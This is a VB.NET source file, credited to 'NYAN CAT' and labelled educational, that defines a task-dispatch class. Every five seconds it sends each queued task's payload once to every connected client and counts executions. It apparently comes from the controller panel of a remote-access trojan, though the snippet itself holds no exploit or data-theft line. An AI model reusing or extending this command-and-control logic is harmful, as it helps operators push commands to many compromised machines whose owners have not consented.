
'       │ Author     : NYAN CAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program is distributed for educational purposes only.


Public Class WorkTask

    Public TaskID As String
    Private AllDone As New List(Of String)
    Public F As Form1
    Private isOK As Boolean = False
    Private Obj As Object()

    Sub New(ParamArray Args As Object())
        Obj = Args
    End Sub

    Delegate Sub _Work(ByVal args As Object())
    Public Async Sub Work(ByVal args As Object())
        While True
            Try
                Await Task.Delay(5000)
                If F.InvokeRequired Then
                    F.Invoke(New _Work(AddressOf Work), New Object() {args})
                    Exit Sub
                Else
                    For Each L As ListViewItem In F.LV3.Items
                        If L.Tag = TaskID Then
                            isOK = True

                            For Each ClientOnServerList In Settings.Online
                                If Not AllDone.Contains(ClientOnServerList.IP.Split(":")(0)) Then
                                    ClientOnServerList.BeginSend(Obj)
                                    ClientOnServerList.LV.SubItems(F._TASKS.Index).Text += 1
                                    L.SubItems(F._EXE.Index).Text += 1
                                    AllDone.Add(ClientOnServerList.IP.Split(":")(0))
                                End If
                            Next
                        End If
                    Next

                    If isOK = False Then
                        Exit Sub
                    End If
                End If
            Catch ex As Exception
                Messages.ClinetLog(Nothing, ex.Message, Color.Red)
                Exit Sub
            End Try
        End While
    End Sub
End Class
